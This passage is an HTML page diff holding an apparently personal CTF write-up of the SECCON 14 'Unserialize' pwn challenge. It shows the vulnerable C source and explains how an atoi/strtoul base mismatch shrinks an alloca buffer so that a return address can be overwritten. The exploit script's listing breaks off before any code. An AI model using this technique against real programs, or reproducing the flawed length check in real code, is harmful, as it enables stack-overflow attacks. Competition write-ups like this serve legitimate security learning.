@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+
+  
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Writeup for the SECCON 14 qualifiers">  
+
+
+  
+  <meta property="og:type" content="website">
+  <meta property="og:description" content="Writeup for the SECCON 14 qualifiers" />
+  <meta property="og:image" content="http://localhost:1313/images/avatar.png" />
+  <meta property="og:url" content="http://localhost:1313/writeups/seccon-14-quals-writeup/">
+  <meta property="og:title" content="SECCON 14 Qualifiers">
+  <meta property="og:site_name" content="hanteed.github.io">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="twitter:domain" content="hanteed.github.io">
+  <meta property="twitter:url" content="http://localhost:1313/writeups/seccon-14-quals-writeup/">
+  <meta name="twitter:title" content="SECCON 14 Qualifiers">
+  <meta name="twitter:description" content="Writeup for the SECCON 14 qualifiers">
+  <meta name="twitter:image" content="http://localhost:1313/images/avatar.png">
+  
+  <title>
+    
+      SECCON 14 Qualifiers
+    
+  </title>
+
+
+  <link rel="icon" type="image/gif" href="/" />
+   
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.4c7b87f65b57a4652be9945b53e9300be00271b35b5b728e6e5b51883dd68524fd35d8c399a2bbb5bd96c5cefce3a4ca5d64999c2eb403bea1a1f837948c812c.css" integrity="sha512-THuH9ltXpGUr6ZRbU&#43;kwC&#43;ACcbNbW3KObltRiD3WhST9NdjDmaK7tb2Wxc7846TKXWSZnC60A76hofg3lIyBLA==" />
+
+  
+
+  
+  
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script>
+      const firebaseConfig = {
+        apiKey: "AIzaSyDiwQ2i5yQ1ovB2aRLBleEKoF-b7bvn8Ns",
+        authDomain: "blog-74cf1.firebaseapp.com",
+        projectId: "blog-74cf1",
+        storageBucket: "blog-74cf1.firebasestorage.app",
+        messagingSenderId: "918222468439",
+        appId: "1:918222468439:web:5f67ed5430881fa0b2fa12",
+        measurementId: ""
+      };
+
+      var app = firebase.initializeApp(firebaseConfig);
+      var db = firebase.firestore();
+      var auth = firebase.auth();
+    </script>
+  
+
+</head>
+
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">/home</a>
+
+
+
+
+<script src="/js/theme-toggle.f10bb0c6283b259e63664053a20ccc48c8b0980e44bceece1c10401c529c2040.js" integrity="sha256-8Quwxig7JZ5jZkBTogzMSMiwmA5EvO7OHBBAHFKcIEA="></script>
+
+<button style="float: right; background: none; outline: none;" onclick="toggleTheme()">
+
+<svg class="w-6 h-6 text-gray-800 dark:text-white theme" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
+  <path fill-rule="evenodd" d="M7.05 4.05A7 7 0 0 1 19 9c0 2.407-1.197 3.874-2.186 5.084l-.04.048C15.77 15.362 15 16.34 15 18a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1c0-1.612-.77-2.613-1.78-3.875l-.045-.056C6.193 12.842 5 11.352 5 9a7 7 0 0 1 2.05-4.95ZM9 21a1 1 0 0 1 1-1h4a1 1 0 1 1 0 2h-4a1 1 0 0 1-1-1Zm1.586-13.414A2 2 0 0 1 12 7a1 1 0 1 0 0-2 4 4 0 0 0-4 4 1 1 0 0 0 2 0 2 2 0 0 1 .586-1.414Z" clip-rule="evenodd"/>
+</svg>
+
+</button>
+
+
+
+
+
+
+<div class="article-container">
+  <article class="article-content">
+    <h1>SECCON 14 Qualifiers</h1>
+
+    <p class="post-meta">
+      <time datetime="2025-12-13 14:57:24 &#43;0100 CET">
+        2025-12-13
+      </time>
+      
+      
+      
+        <span class="meta-separator">•</span>
+      
+      
+      
+        <span class="meta-item">
+  
+  
+    
+    
+  
+  <span id="views_writeups/seccon-14-quals-writeup.md" class="counter-loading" title="views">...</span>
+  <svg class="icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="18" height="18">
+    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+    <circle cx="12" cy="12" r="3"></circle>
+  </svg>
+</span>
+
+      
+      
+      
+        <span class="meta-separator">•</span>
+      
+      
+      
+        <span class="meta-item">
+  
+  
+    
+    
+  
+  <span id="likes_writeups/seccon-14-quals-writeup.md" class="counter-loading" title="likes">...</span>
+  <svg class="icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
+    <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+  </svg>
+</span>
+
+      
+      
+      
+        <span class="meta-item">
+  <button id="button_likes" class="like-button" title="Click to like">
+    <svg id="button_likes_heart" class="heart-icon filled" style="display: none;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="18" height="18">
+      <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+    </svg>
+    <svg id="button_likes_empty_heart" class="heart-icon empty" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
+      <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+    </svg>
+    <span id="button_likes_text">Like</span>
+  </button>
+</span>
+
+      
+    </p>
+
+    <details><summary>CTF Summary</summary>
+<blockquote>
+<p>Difficulty : Very hard (100/100 ctftime weight)</p>
+</blockquote>
+<blockquote>
+<p>Team : skibideur2ctf (yeah I know)</p>
+</blockquote>
+<blockquote>
+<p>Author : ptr-yudai</p>
+</blockquote>
+<blockquote>
+<p>Topics : pwn</p>
+</blockquote>
+</details>
+<h1 id="unserialize">Unserialize</h1>
+<h2 id="overview">Overview</h2>
+<p>The code for this challenge was provided. It basically &ldquo;unserializes&rdquo; your input.</p>
+<details><summary>main.c</summary>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e67e80">#include</span> <span style="color:#e67e80;font-style:italic">&lt;ctype.h&gt;</span><span style="color:#e67e80">
+</span></span></span><span style="display:flex;"><span><span style="color:#e67e80">#include</span> <span style="color:#e67e80;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#e67e80">
+</span></span></span><span style="display:flex;"><span><span style="color:#e67e80">#include</span> <span style="color:#e67e80;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#e67e80">
+</span></span></span><span style="display:flex;"><span><span style="color:#e67e80">#include</span> <span style="color:#e67e80;font-style:italic">&lt;string.h&gt;</span><span style="color:#e67e80">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">ssize_t</span> <span style="color:#b2c98f">unserialize</span>(FILE <span style="color:#7a8478">*</span>fp, <span style="color:#dbbc7f">char</span> <span style="color:#7a8478">*</span>buf, <span style="color:#dbbc7f">size_t</span> size) {
+</span></span><span style="display:flex;"><span>  <span style="color:#dbbc7f">char</span> szbuf[<span style="color:#d699b6">0x20</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#dbbc7f">char</span> <span style="color:#7a8478">*</span>tmpbuf;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">for</span> (<span style="color:#dbbc7f">size_t</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>; i <span style="color:#7a8478">&lt;</span> <span style="color:#e67e80">sizeof</span>(szbuf); i<span style="color:#7a8478">++</span>) {
+</span></span><span style="display:flex;"><span>    szbuf[i] <span style="color:#7a8478">=</span> <span style="color:#b2c98f">fgetc</span>(fp);
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (szbuf[i] <span style="color:#7a8478">==</span> <span style="color:#b2c98f">&#39;:&#39;</span>) {
+</span></span><span style="display:flex;"><span>      szbuf[i] <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#e67e80">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (<span style="color:#7a8478">!</span><span style="color:#b2c98f">isdigit</span>(szbuf[i]) <span style="color:#7a8478">||</span> i <span style="color:#7a8478">==</span> <span style="color:#e67e80">sizeof</span>(szbuf) <span style="color:#7a8478">-</span> <span style="color:#d699b6">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#e67e80">return</span> <span style="color:#7a8478">-</span><span style="color:#d699b6">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">if</span> (<span style="color:#b2c98f">atoi</span>(szbuf) <span style="color:#7a8478">&gt;</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> <span style="color:#7a8478">-</span><span style="color:#d699b6">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  tmpbuf <span style="color:#7a8478">=</span> (<span style="color:#dbbc7f">char</span><span style="color:#7a8478">*</span>)<span style="color:#b2c98f">alloca</span>(<span style="color:#b2c98f">strtoul</span>(szbuf, <span style="color:#d699b6">NULL</span>, <span style="color:#d699b6">0</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#dbbc7f">size_t</span> sz <span style="color:#7a8478">=</span> <span style="color:#b2c98f">strtoul</span>(szbuf, <span style="color:#d699b6">NULL</span>, <span style="color:#d699b6">10</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">for</span> (<span style="color:#dbbc7f">size_t</span> i <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>; i <span style="color:#7a8478">&lt;</span> sz; i<span style="color:#7a8478">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (<span style="color:#b2c98f">fscanf</span>(fp, <span style="color:#b2c98f">&#34;%02hhx&#34;</span>, tmpbuf <span style="color:#7a8478">+</span> i) <span style="color:#7a8478">!=</span> <span style="color:#d699b6">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#e67e80">return</span> <span style="color:#7a8478">-</span><span style="color:#d699b6">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#b2c98f">memcpy</span>(buf, tmpbuf, sz);
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">return</span> sz;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">int</span> <span style="color:#b2c98f">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#dbbc7f">char</span> buf[<span style="color:#d699b6">0x100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#b2c98f">setbuf</span>(stdin, <span style="color:#d699b6">NULL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#b2c98f">setbuf</span>(stdout, <span style="color:#d699b6">NULL</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">if</span> (<span style="color:#b2c98f">unserialize</span>(stdin, buf, <span style="color:#e67e80">sizeof</span>(buf)) <span style="color:#7a8478">&lt;</span> <span style="color:#d699b6">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#b2c98f">puts</span>(<span style="color:#b2c98f">&#34;[-] Deserialization faield&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#e67e80">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#b2c98f">puts</span>(<span style="color:#b2c98f">&#34;[+] Deserialization success&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e67e80">return</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div></details>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The vulnerability to exploit in this challenge resides in an inconsitency bug
+from <code>atoi()</code> and <code>strtoul()</code>. The program calls atoi to obtain the length of the string
+(base 10) and then uses strtoul to obtain the size of the input (base 8).</p>
+<p>This difference in bases allows us to input a string starting with &lsquo;0&rsquo; to be interpreted
+as octal causing a smaller allocation than intended. The conversion will happen
+on every octal character before &lsquo;:&rsquo; and will stop if one of the digits does not
+follow this criteria. We can then overflow the stack thanks to <code>alloca()</code>.</p>
+<p>Here is an example:</p>
+<p>The value we passed was <code>0249</code>:</p>
+<ul>
+<li><code>atoi()</code> is passed with &ldquo;0249&rdquo;,  which returns <code>249</code>.</li>
+<li>The first <code>strtoul()</code> is called in the following way: <code>strtoul(&quot;0249&quot;, NULL, 0)</code>, which returns <code>20</code>, since the <code>9</code> is ignored and <code>24</code> in octal is <code>20</code> in decimal.</li>
+<li><code>alloca()</code> allocates less bytes than what we passed in decimal (249 bytes).</li>
+</ul>
+<p>We could also use <code>04294967296</code> to cause a huge overflow though we didn&rsquo;t explore this method at all.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The binary is statically compiled and has no PIE.</p>
+<p>In our exploit we will replace the destination of <code>memcpy()</code> to overwrite the return address.</p>
+<details><summary>exploit.py</summary>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">54
